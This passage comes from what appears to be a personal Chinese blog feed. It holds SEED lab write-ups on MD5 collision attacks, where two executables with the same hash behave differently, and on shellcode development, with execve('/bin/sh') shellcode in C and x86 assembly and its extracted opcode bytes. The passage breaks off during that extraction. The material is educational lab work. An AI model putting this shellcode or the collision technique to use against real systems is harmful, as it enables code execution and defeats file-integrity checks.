href="https://vimcn.github.io/vimcdoc/doc/help.html">vim中文文档</a></li></ul><h1 id="Vim插件"><a href="#Vim插件" class="headerlink" title="Vim插件"></a>Vim插件</h1><ul><li><a href="https://www.twilio.com/blog/5-must-have-vim-plugins-that-will-change-your-workflow">5 Must-Have Vim Plugins That Will Change Your Workflow</a></li><li><a href="https://spacevim.org/">spacevim</a></li></ul><h1 id="在其他软件上使用vim"><a href="#在其他软件上使用vim" class="headerlink" title="在其他软件上使用vim"></a>在其他软件上使用vim</h1><ul><li>jetbrain系软件的Vim插件</li><li>Chrome浏览器的Surfingkeys插件</li><li>Vscode的Vim插件</li></ul><h1 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h1><p><a href="https://zhuanlan.zhihu.com/p/599417117">如何使用原生 vim 覆盖90%的插件功能 - 知乎</a><br><a href="https://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim/1220118#1220118">vi - What is your most productive shortcut with Vim? - Stack Overflow</a></p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1>]]></content>
    
    
    <categories>
      
      <category>计算机教育中缺失的一课</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：MD5 Collision Attack Lab</title>
    <link href="/p/45f7d752/"/>
    <url>/p/45f7d752/</url>
    
    <content type="html"><![CDATA[<h1 id="Task-1-Generating-Two-Different-Files-with-the-Same-MD5-Hash"><a href="#Task-1-Generating-Two-Different-Files-with-the-Same-MD5-Hash" class="headerlink" title="Task 1: Generating Two Different Files with the Same MD5 Hash"></a>Task 1: Generating Two Different Files with the Same MD5 Hash</h1><p>在这个任务中，我们将生成两个具有相同 MD5哈希值的不同文件。这两个文件的开头部分必须是相同的，也就是说，它们共享相同的前缀。我们可以使用 md5colgen 程序实现这一点，该程序允许我们提供具有任意内容的前缀文件</p><p>该程序的工作方式如图所示</p><p><img src="https://img.gls.show/img/image-20230614012709811.png" alt="image-20230614012709811"></p><p>下面的命令为给定的前缀文件 prefix.txt 生成两个输出文件 out1.bin 和 out2.bin:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> zara &gt; prefix.txt</span><br><span class="hljs-meta">$</span><span class="bash"> md5collgen -p prefix.txt -o out1.bin out2.bin</span><br></code></pre></td></tr></table></figure><p>这样就创建了两个文件out1.bin out2.bin</p><p>发现两个文件的md5确实一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">[06/<span class="hljs-number">13</span>/<span class="hljs-number">23</span>]seed@VM:~$ md5sum out1.<span class="hljs-built_in">bin</span> out2.<span class="hljs-built_in">bin</span> <br>b1eb0da929692656edc11a9d93733d39  out1.<span class="hljs-built_in">bin</span><br>b1eb0da929692656edc11a9d93733d39  out2.<span class="hljs-built_in">bin</span><br></code></pre></td></tr></table></figure><blockquote><p>由于 out1.bin 和 out2.bin 是二进制的，我们不能使用文本查看器程序(如 cat 或更多)查看它们; 我们需要使用二进制编辑器来查看(和编辑)它们</p></blockquote><p>使用xxd -p分别取出两个文件的十六进制序列，用vimdiff比对一下：</p><p><img src="https://img.gls.show/img/image-20230614012253064.png" alt="image-20230614012253064"></p><p>Question：</p><ul><li>如果prefix不到64那么会补0直到64（包含0A）。之后会生成128长度的内容，总长度为64+128=192</li><li>如果prefix正好是64（63个A+一个0A），那么不会补0，总长度为64+128=192<ul><li>使用<code>echo &quot;$(python3 -c &#39;print(&quot;A&quot;*63)&#39;)&quot; &gt; prefix.txt</code>命令，可以使得该文件有63个A和一个0A，正好是64个</li></ul></li><li>如果prefix是192个，那么不会补0，总长度为192+128</li><li>如果prefix是200个，那么会补0直到256，总长度为256+128</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/14/23]seed@VM:~$ echo &quot;$(python3 -c &#x27;print(&quot;A&quot;*256)&#x27;)&quot; &gt; prefix.txt <br>[06/14/23]seed@VM:~$ md5collgen -p prefix.txt -o p1.bin p2.bin <br>MD5 collision generator v1.5<br>by Marc Stevens (http://www.win.tue.nl/hashclash/)<br><br>Using output filenames: &#x27;p1.bin&#x27; and &#x27;p2.bin&#x27;<br>Using prefixfile: &#x27;prefix.txt&#x27;<br>Using initial value: 74ff661088a332eb0b5d16ad326e89c5<br><br>Generating first block: ............<br>Generating second block: S11.....................................<br>Running time: 9.41273 s<br>[06/14/23]seed@VM:~$ bless p1.bin <br>Gtk-Message: 10:37:59.970: Failed to load module &quot;canberra-gtk-module&quot;<br>Could not find a part of the path &#x27;/home/seed/.config/bless/plugins&#x27;.<br>Could not find a part of the path &#x27;/home/seed/.config/bless/plugins&#x27;.<br>Could not find a part of the path &#x27;/home/seed/.config/bless/plugins&#x27;.<br>Could not find file &quot;/home/seed/.config/bless/export_patterns&quot;<br>[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>fc4106d2ee477d8c0f1935bdd94122ac  p1.bin<br>fc4106d2ee477d8c0f1935bdd94122ac  p2.bin<br><br></code></pre></td></tr></table></figure><h1 id="Task-2-Understanding-MD5’s-Property"><a href="#Task-2-Understanding-MD5’s-Property" class="headerlink" title="Task 2: Understanding MD5’s Property"></a>Task 2: Understanding MD5’s Property</h1><p>MD5算法的如下性质: 给定两个输入 M 和 N，如果 MD5(M) = MD5(N) ，即 M 和 N 的 MD5散列是相同的，那么对于任何输入 T，MD5(M ‖ T) = MD5(N ‖ T) ，其中‖表示级联</p><p>验证性质：如果输入 M 和 N 具有相同的哈希值，将相同的后缀 T 添加到它们将导致具有相同哈希值的两个输出。此属性不仅适用于 MD5哈希算法，还适用于许多其他哈希算法。在这个任务中的工作是设计一个实验来证明这个属性适用于 MD5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>69c4760a3459c3ec8f93d3022a7c6654  p1.bin<br>69c4760a3459c3ec8f93d3022a7c6654  p2.bin<br>[06/14/23]seed@VM:~$ echo nm &gt;&gt; p1.bin <br>[06/14/23]seed@VM:~$ echo nm &gt;&gt; p2.bin <br>[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>6b4afe7b7301613ae99ce848080ffa96  p1.bin<br>6b4afe7b7301613ae99ce848080ffa96  p2.bin<br></code></pre></td></tr></table></figure><h1 id="Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash"><a href="#Task-3-Generating-Two-Executable-Files-with-the-Same-MD5-Hash" class="headerlink" title="Task 3: Generating Two Executable Files with the Same MD5 Hash"></a>Task 3: Generating Two Executable Files with the Same MD5 Hash</h1><p>创建两个可执行程序，使其 xyz 数组的内容不同，但可执行文件的哈希值是相同的。这个还有意思，你可以把一个程序的内容改变，但是在md5的层面上，它们是没有区别的，从而绕过完整性验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> xyz[<span class="hljs-number">200</span>] = &#123;<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">200</span>; i++)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>, xyz[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>生成xyz数组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;$(python3 -c &#x27;print(&quot;0x41,&quot;*199)&#x27;)&quot;<br></code></pre></td></tr></table></figure><p>会用到的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> head -c 3200 a.out &gt; prefix</span><br><span class="hljs-meta">$</span><span class="bash"> tail -c 100 a.out &gt; suffix</span><br><span class="hljs-meta">$</span><span class="bash"> tail -c +3300 a.out &gt; suffix</span><br></code></pre></td></tr></table></figure><ul><li>第一个命令将 a.out 的前3200字节保存为prefix</li><li>第二个命令将文件的最后100字节保存为suffix</li><li>第三个命令将文件的第3300个字节到末尾的数据保存到suffix</li></ul><p>一个基本原理：若$MD5 (prefix ‖P) = MD5 (prefix ‖Q)$成立，那么$MD5 (prefix ‖P ‖suffix) = MD5 (prefix ‖Q ‖suffix)成立$</p><p>换句话说，如果一个文件和另一个文件的md5值已经相等，那么在它们的后面附加相同的内容，仍然相等</p><p><strong>回到这个任务的要求上，我们找到二进制文件十六进制先显示的prefix+AAAA处，执行md5col，可以得到md5col（prefix+AAAA），之后再附加suffix，即可完成目标所需的两个可执行文件</strong></p><p>看一下AAAA的位置</p><p><img src="https://img.gls.show/img/image-20230615004528181.png" alt="image-20230615004528181"></p><p>$12320/64=192.5$</p><p>$12352/64=193$</p><p>因此，12353~末尾为suffix</p><p>下面过程比较简单就不描述了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/14/23]seed@VM:~$ head -c 12324 a.out &gt; prefix<br>[06/14/23]seed@VM:~$ tail -c 12353 a.out &gt; suffix<br>[06/14/23]seed@VM:~$ md5collgen -p prefix -o p1.bin p2.bin <br>MD5 collision generator v1.5<br>by Marc Stevens (http://www.win.tue.nl/hashclash/)<br><br>Using output filenames: &#x27;p1.bin&#x27; and &#x27;p2.bin&#x27;<br>Using prefixfile: &#x27;prefix&#x27;<br>Using initial value: 6a415b5a106e730948ad2d1abe26cfd3<br><br>Generating first block: ...<br>Generating second block: W.....................<br>Running time: 1.83808 s<br>[06/14/23]seed@VM:~$ cat suffix &gt;&gt; p1.bin <br>[06/14/23]seed@VM:~$ cat suffix &gt;&gt; p2.bin <br>[06/14/23]seed@VM:~$ sudo chmod +x p1.bin p2.bin <br>[06/14/23]seed@VM:~$ ./p1.bin <br>41414141000000000000000000000000000020f253f1bb456b3ce9be3d814456444d94d868c31d7c42867c924cae99a6fdb9cadf6aadc120e7634a1bfec34f10d8ffe44eced2944d8a99ae965727c48fbcad2e235596e0eb6c4c961fcfa440ce86b2ba4825b44d22393e17cba614ce856f3656b790be8be81c1a99840595dc448dc9bc0d27393e6244377e0bf614a89e741ff14df4883c314839dd75ea4883c485b5d415c415d415e415fc366662ef1f840000<br>[06/14/23]seed@VM:~$ ./p2.bin <br>41414141000000000000000000000000000020f253f1bb456b3ce9be3d814456444d945868c31d7c42867c924cae99a6fdb9cadf6aadc120e7634a1bfe435010d8ffe44eced2944d8a99ae165727c48fbcad2e235596e0eb6c4c961fcfa440ce86b2bac825b44d22393e17cba614ce856f3656b790be8be81c1a998c0585dc448dc9bc0d27393e62443f7e0bf614a89e741ff14df4883c314839dd75ea4883c485b5d415c415d415e415fc366662ef1f840000<br>[06/14/23]seed@VM:~$ md5sum p1.bin p2.bin <br>0a0c4456dec1a3c45c7b382613cc71ad  p1.bin<br>0a0c4456dec1a3c45c7b382613cc71ad  p2.bin<br><br></code></pre></td></tr></table></figure><p>这里创建了两个具有相同 MD5散列的程序，它们之间的区别仅仅在于它们打印出来的数据</p><p><img src="https://img.gls.show/img/image-20230615005533457.png" alt="image-20230615005533457"></p><h1 id="Task-4-Making-the-Two-Programs-Behave-Differently"><a href="#Task-4-Making-the-Two-Programs-Behave-Differently" class="headerlink" title="Task 4: Making the Two Programs Behave Differently"></a>Task 4: Making the Two Programs Behave Differently</h1><p>创建两个共享相同 MD5散列的程序。一个程序将始终执行正常指令，而另一个程序将执行恶意指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> x[<span class="hljs-number">200</span>] = &#123;<br><span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>,<br>    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x41</span><br><br>&#125;;<br><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> y[<span class="hljs-number">200</span>] = &#123;<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">200</span>; i++)&#123;<br>    <span class="hljs-keyword">if</span>(x[i] != y[i])&#123; <span class="hljs-keyword">break</span>; &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(i == <span class="hljs-number">200</span>)&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;benign code&quot;</span>); &#125; <span class="hljs-comment">/* x = y */</span><br>  <span class="hljs-keyword">else</span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;WARNING: malicious code&quot;</span>); &#125; <span class="hljs-comment">/* x != y */</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>将上面源码编译为a.out文件</p><p>12320偏移处出现了AAAA，说明这里是x数组开始处</p><p>将前12324个bytes作为prefix，生成md5碰撞的p1 p2 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> head -c 12324 a.out &gt; prefix</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> md5collgen -p prefix -o p1 p2</span><br>MD5 collision generator v1.5<br>by Marc Stevens (http://www.win.tue.nl/hashclash/)<br><br>Using output filenames: &#x27;p1&#x27; and &#x27;p2&#x27;<br>Using prefixfile: &#x27;prefix&#x27;<br>Using initial value: 378d43f1d8999353cc974181bbf31423<br><br>Generating first block: ...<br>Generating second block: S11.......................<br>Running time: 2.85953 s<br></code></pre></td></tr></table></figure><p><img src="https://img.gls.show/img/image-20230616022632664.png" alt="image-20230616022632664"></p><p>我们可以看出，a.out的A的数据区有0xe0个数据</p><p>打开p1的bless，将A的数据区填充到0xe0个数据（发现需要64个0，这里我直接在zero文件中写入63个0，加上0A正好是64）</p><p><img src="https://img.gls.show/img/image-20230616022901794.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;$(python3 -c &#x27;print(&quot;A&quot;*63)&#x27;)&quot; &gt; zero<br><br>[06/15/23]seed@VM:~$ cat zero &gt;&gt; p1 <br>[06/15/23]seed@VM:~$ cat zero &gt;&gt; p2 <br></code></pre></td></tr></table></figure><p>之后将a.out中B的数据区之后的内容接到p1、p2的末尾即可</p><p><img src="https://img.gls.show/img/image-20230616023556027.png"></p><p>发现p1、p2的内容md5值相同，但是运行结果不同</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Shellcode Development Lab</title>
    <link href="/p/a10ed24d/"/>
    <url>/p/a10ed24d/</url>
    
    <content type="html"><![CDATA[<p><img src="https://gls.show/image/shellshock.png"></p><h1 id="Task-1-a"><a href="#Task-1-a" class="headerlink" title="Task 1.a"></a>Task 1.a</h1><p>首先来看一下C语言版本的shellcode：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    <span class="hljs-keyword">char</span> *argv[2]</span>;<br>    argv[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    argv[<span class="hljs-number">1</span>]=<span class="hljs-literal">NULL</span>;<br>    execve (argv[<span class="hljs-number">0</span>],argv,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>下面汇编代码可以启动一个shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asm">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure><p>几点解释：</p><ul><li></li></ul><p>使用nasm 编译上面的汇编代码(mysh.s) </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> nasm <span class="hljs-operator">-f</span> elf32 mysh.s <span class="hljs-literal">-o</span> mysh.o<br></code></pre></td></tr></table></figure><blockquote><p>nasm 是用于 Intel x86和 x64架构的汇编和反汇编程序。-f elf32选项表明我们希望将代码编译为32位 ELF 二进制格式</p></blockquote><p>掏出程序的生命周期图，可以更好的理解nasm工作原理</p><p><img src="https://gls.show/image/31h00bitb5.jpg"></p><p>通过链接得到可执行文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ld -m elf_i386 mysh.o -o mysh</span><br></code></pre></td></tr></table></figure><p>可以通过<code>./mysh</code>启动shell，然后使用<code>echo $$</code>得到目前进程的id，从而验证是否成功开启了shell</p><p>接下来，我们需要从可执行文件或目标文件中提取机器代码（machine code）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> objdump -Mintel --disassemble mysh.o</span><br><br>mysh.o:     file format elf32-i386<br><br><br>Disassembly of section .text:<br><br>00000000 &lt;_start&gt;:<br>   0:31 c0                xor    eax,eax<br>   2:50                   push   eax<br>   3:68 2f 2f 73 68       push   0x68732f2f<br>   8:68 2f 62 69 6e       push   0x6e69622f<br>   d:89 e3                mov    ebx,esp<br>   f:50                   push   eax<br>  10:53                   push   ebx<br>  11:89 e1                mov    ecx,esp<br>  13:31 d2                xor    edx,edx<br>  15:31 c0                xor    eax,eax<br>  17:b0 0b                mov    al,0xb<br>  19:cd 80                int    0x80<br></code></pre></td></tr></table></figure><ul><li>-Mintel表示显示Intel格式的汇编代码，而非默认的ATT格式</li><li>–disassemble表示反汇编，也可以使用-d代替</li></ul><p>可以使用xxd命令获取二进制序列</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> xxd -p -c 20 mysh.o</span><br><br>7f454c4601010100000000000000000001000300<br>0100000000000000000000004000000000000000<br>3400000000002800050002000000000000000000<br>0000000000000000000000000000000000000000<br>0000000000000000000000000000000000000000<br>0000000001000000010000000600000000000000<br>100100001b000000000000000000000010000000<br>0000000007000000030000000000000000000000<br>3001000021000000000000000000000001000000<br>0000000011000000020000000000000000000000<br>6001000040000000040000000300000004000000<br>1000000019000000030000000000000000000000<br>a00100000f000000000000000000000001000000<br>00000000000000000000000031c050682f2f7368<br>682f62696e89e3505389e131d231c0b00bcd8000<br>00000000002e74657874002e7368737472746162<br>002e73796d746162002e73747274616200000000<br>0000000000000000000000000000000000000000<br>0000000000000000010000000000000000000000<br>0400f1ff00000000000000000000000003000100<br>08000000000000000000000010000100006d7973<br>682e73005f73746172740000<br></code></pre></td></tr></table></figure><ul><li>-p表示列之间不需要空格</li><li>-c 20表示一行有20个字符</li></ul><p>提取出我们需要的二进制序列：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">31</span><span class="hljs-keyword">c</span><span class="hljs-number">050682</span>f<span class="hljs-number">2</span>f<span class="hljs-number">7368</span><br><span class="hljs-number">682</span>f<span class="hljs-number">62696e89</span>e<span class="hljs-number">3505389e131</span>d<span class="hljs-number">231</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>b<span class="hljs-number">00</span>bcd<span 